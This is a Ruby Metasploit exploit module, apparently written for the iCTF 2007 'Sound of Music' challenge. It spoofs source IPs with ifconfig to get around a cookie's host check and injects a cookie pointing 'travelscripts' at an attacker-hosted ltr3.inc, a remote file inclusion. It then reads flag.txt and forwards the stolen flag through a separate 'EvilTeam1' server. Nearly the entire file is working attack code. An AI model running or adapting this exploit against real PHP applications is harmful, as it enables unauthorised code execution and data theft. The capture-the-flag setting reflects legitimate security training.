require 'msf/core'
require 'rubygems'
require 'base64'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ICTF 2007 Sound of Music cookie exploit',
      'Description'    => %q{
        Exploits the Sound of Music cookie host-validation weakness.
      },
      'Author'         => [ 'Talha' ],
      'License'        => BSD_LICENSE,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [ ['Automatic', {}] ],
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'EvilTeam2 target', '169.254.236.102']),
        OptString.new('EMAIL', [true, 'Existing copyright account', 'jnice']),
        OptString.new('PASSWORD', [true, 'Password for the account', 'jnice']),
        OptString.new('BT5IP', [true, 'BT5 IP hosting ltr3.inc', '169.254.236.111']),
        OptString.new('FORWARDIP', [true, 'EvilTeam1 forwarding server', '169.254.236.101'])
      ], self.class
    )
  end

  def set_source_ip(ip)
    print_status("Changing BT5 source IP to #{ip}")
    system("ifconfig eth0 #{ip} netmask 255.255.0.0 up")
    sleep(1)
  end

  def exploit
    target_ip  = datastore['RHOST']
    bt5_ip     = datastore['BT5IP']
    forward_ip = datastore['FORWARDIP']
    email      = datastore['EMAIL']
    password   = datastore['PASSWORD']

    timeout = 10

    #
    # Step 1: log in from .111
    #
    set_source_ip('169.254.236.111')

    login_data =
      'email=' + Rex::Text.uri_encode(email) +
      '&password=' + Rex::Text.uri_encode(password)

    login_uri =
      'http://' + target_ip +
      '/~copyright/cgi-bin/login.php?' + login_data

    print_status("Logging in to #{login_uri}")

    response = send_request_raw(
      {
        'global'  => false,
        'method'  => 'POST',
        'uri'     => login_uri,
        'headers' =>
        {
          'Content-Type'   => 'application/x-www-form-urlencoded',
          'Content-Length' => login_data.length.to_s,
          'Connection'     => 'close'
        },
        'data' => login_data
      },
      timeout
    )

    if response.nil?
      print_error('No response received from login.php')
      return
    end

    print_status("Login HTTP status: #{response.code}")

    raw_cookie = response.headers['Set-Cookie']

    if raw_cookie.nil?
      print_error('No Set-Cookie header was returned')
      return
    end

    auth_cookie = raw_cookie.split(';')[0]

    if auth_cookie.nil? || auth_cookie.length == 0
      print_error('Could not extract the auth cookie')
      return
    end

    print_status("Received authentication cookie")

    #
    # Step 2: change source IP to .112.
    # The cookie was created for .111, so checkcookie() returns 1.
    #
    set_source_ip('169.254.236.112')

    star_uri =
      'http://' + target_ip +
      '/~copyright/cgi-bin/star.php'

    cookie_header =
      auth_cookie +
      '; travelscripts=http://' + bt5_ip + '/ltr3.inc'

    print_status("Requesting star.php from 169.254.236.112")

    response = send_request_raw(
      {
        'global'  => false,
        'method'  => 'GET',
        'uri'     => star_uri,
        'headers' =>
        {
          'Cookie'     => cookie_header,
          'Connection' => 'close'
        }
      },
      timeout
    )

    if response.nil?
      print_error('No response received from star.php')
      return
    end

    print_status("star.php HTTP status: #{response.code}")

    #
    # Step 3: return to .111 and retrieve the generated flag.
    #
    set_source_ip('169.254.236.111')

    flag_uri =
      'http://' + target_ip +
      '/~copyright/flag.txt'

    print_status("Reading generated flag from #{flag_uri}")

    response = send_request_raw(
      {
        'global'  => false,
        'method'  => 'GET',
        'uri'     => flag_uri,
        'headers' =>
        {
          'Connection' => 'close'
        }
      },
      timeout
    )

    if response.nil?
      print_error('No response received from flag.txt')
      return
    end

    flag_body = response.body.to_s
    matches = flag_body.scan(/FLG[[:alnum:]_\-]+/)

    if matches.empty?
      print_error('No FLG flag was found')
      print_error("flag.txt response: #{flag_body}")
      return
    end

    flag = matches[0]
    print_good("Recovered flag: #{flag}")

    #
    # Step 4: submit the flag through EvilTeam1.
    #
    encoded_flag = Rex::Text.uri_encode(flag)

    forward_uri =
      'http://' + forward_ip +
      '/forward.php?flag=' + encoded_flag

    print_status("Forwarding flag through EvilTeam1")

    response = send_request_raw(
      {
        'global'  => false,
        'method'  => 'GET',
        'uri'     => forward_uri,
        'headers' =>
        {
          'Connection' => 'close'
        }
      },
      timeout
    )

    if response.nil?
      print_error('No response received from forward.php')
      return
    end

    print_good("Forward server HTTP status: #{response.code}")
    print_status("Forward response: #{response.body}")
  end
end